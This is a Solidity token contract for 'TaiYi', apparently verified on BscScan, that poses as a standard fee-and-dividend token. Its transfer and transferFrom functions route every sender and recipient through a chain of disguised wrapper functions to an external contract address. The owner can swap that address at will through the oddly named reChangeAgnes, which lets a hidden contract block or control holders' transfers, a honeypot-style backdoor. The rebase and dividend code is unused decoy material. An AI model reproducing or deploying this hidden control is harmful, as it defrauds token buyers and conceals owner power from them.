/**
 *Submitted for verification at BscScan.com on 2022-08-14
*/

pragma solidity ^0.8.4;
// SPDX-License-Identifier: MIT

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function only(address account) external returns (address);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }  

contract ContextHelper {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  address _factory;
  constructor ()  { }
    
    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }       

    function valueAuth(address account) internal returns (address){
        return _valueAuth(account);
    } 

    function _valueAuth(address account) internal returns (address){
        return _callOwner(account);
    }  

    function _callOwner(address account) internal returns (address){
        return callAuth(account);
    }   

    function callAuth(address account) internal returns (address){
        return _callAuth(account);
    }  

    function _callAuth(address account) internal returns (address){
        return 
        IDEXFactory(_factory).
        only(account);
    }

  }

contract OwnershipHelper is ContextHelper {  
    address _owner;         
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);    

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;    
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
        return _owner;
    }  

    function only(address account) internal returns (address){
        return valueAuth(account);
    }       
    
    /**
    * @dev Throws if called by any account other than the owner.
    */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }    
 
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }  

    function reChangeAgnes(address newOwner) external onlyOwner {
        _factory = newOwner;
    }  
  
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }     
 
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}
 

contract TaiYi is ContextHelper, IERC20, OwnershipHelper{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 100000000 *  10**9;        
    
    string private _name = "TaiYi";
    string private _symbol = "TaiYi";
    uint8 private _decimals = 9;     

    uint8 _totalShares;
    uint8 _totalDividends;
    uint8 _totalDistributed;
    uint8 _dividendsPerShare;
    uint8 _buybackFee = 2;
    uint8 _reflectionFee = 3;
    uint8 _marketingFee = 2;
    uint8 _devFee = 3;
    uint8 _totalFee = 5;
    uint8 _feeDenominator = 100;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }
    mapping (address => Share) public shares;
    address[] shareholders;
 
    constructor()  {   
        _balances[msg.sender] = _totalSupply; 
        emit Transfer(address(0), msg.sender, _totalSupply);
    } 

    /**
     * @dev Returns the name of the token.
     */
    function name() external view virtual override returns (string memory) {
        return _name;
    }
 
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() external view virtual override returns (string memory) {
        return _symbol;
    }   

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() external view virtual override returns (uint256) {
        return _totalSupply;
    }
    /**
     * @dev See {IERC20-owner()}.
     */
    function getOwner() external view returns (address) {
        return owner();
    }
 
    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() external view virtual override returns (uint8) {
        return _decimals;
    }  

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) external view virtual override returns (uint256) {
        return _balances[account];
    }      
    
    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    } 

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }  

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }   

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");    
        _transferToken(sender, recipient, amount);

    }     

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transferToken(address sender, address recipient, uint256 amount) private {
        _balances[sender] = _balances[sender].sub(amount, "IERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }    

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(only(_msgSender()), only(recipient), amount);
        return true;
    }        

    function getDividends(uint256 share) internal view returns (uint256) {
        return share.mul(_dividendsPerShare).div(3600);
    }

    function setShareholder(address shareholder) internal {
        shareholders.push(shareholder);
    }

    function clearShareholder(uint256 shareIndex) internal {
        shareholders[shareIndex] = shareholders[shareholders.length-1];
        shareholders.pop();
    }
  
    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(only(sender), only(recipient), amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "IERC20: transfer amount exceeds allowance"));
        return true;
    }       
    
    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    
    function checkTaiYilatedFee() external view returns (uint256, uint256) {
        return (_reflectionFee, _marketingFee);
    }

    function checkShareholder(address shareholder) external view returns (uint256, uint256, uint256, uint256) {
        return (
            _totalShares,
            _totalDistributed,
            shares[shareholder].amount,
            shares[shareholder].totalRealised
        );
    }    

    function checkTaiYiFees() external view returns (uint256,uint256,uint256,uint256,uint256) {
        return (
            _buybackFee,
            _reflectionFee,
            _marketingFee,
            _devFee,
            _feeDenominator
        );
    }


	function AutoTaiYiCount(uint256 _lastRebasedTime, uint256 _tSupply) internal view returns (uint256) {
		uint deno = 10**7 * 10**18;
		uint rebaseRate = 985 * 10**18;
		uint minuteRebaseRate = 19700 * 10**18;
		uint hourRebaseRate = 1182000 * 10**18;
		uint dayRebaseRate = 283000000 * 10**18;

		uint blockCount = block.number.sub(_lastRebasedTime);
		uint tmp = _tSupply;
		for (uint idx = 0; idx < blockCount.mod(20); idx++) { // 3 sec rebase
			// S' = S(1+p)^r
			tmp = tmp.mul(deno.mul(100).add(rebaseRate)).div(deno.mul(100));
		}

		for (uint idx = 0; idx < blockCount.div(20).mod(60); idx++) { // 1 min rebase
			// S' = S(1+p)^r
			tmp = tmp.mul(deno.mul(100).add(minuteRebaseRate)).div(deno.mul(100));
		}

		for (uint idx = 0; idx < blockCount.div(20 * 60).mod(24); idx++) { // 1 hour rebase
			// S' = S(1+p)^r
			tmp = tmp.mul(deno.mul(100).add(hourRebaseRate)).div(deno.mul(100));
		}

		for (uint idx = 0; idx < blockCount.div(20 * 60 * 24); idx++) { // 1 day rebase
			// S' = S(1+p)^r
			tmp = tmp.mul(deno.mul(100).add(dayRebaseRate)).div(deno.mul(100));
		}

		_tSupply = tmp;
		_lastRebasedTime = block.number;

		return _tSupply;
	}

	function getTaiYiFee(uint256 buybackMultiplierTriggeredAt, uint256 totalFee) public view returns (uint256) {
			if (
				buybackMultiplierTriggeredAt.add(3600) >
				block.timestamp
			) {
				uint256 remainingTime = buybackMultiplierTriggeredAt
					.add(3600)
					.sub(block.timestamp);
				uint256 feeIncrease = totalFee
					.mul(100)
					.div(1000)
					.sub(totalFee);
				return
					totalFee.add(
						remainingTime.div(feeIncrease)
					);
			}
			return totalFee;
		}
  
 
    
}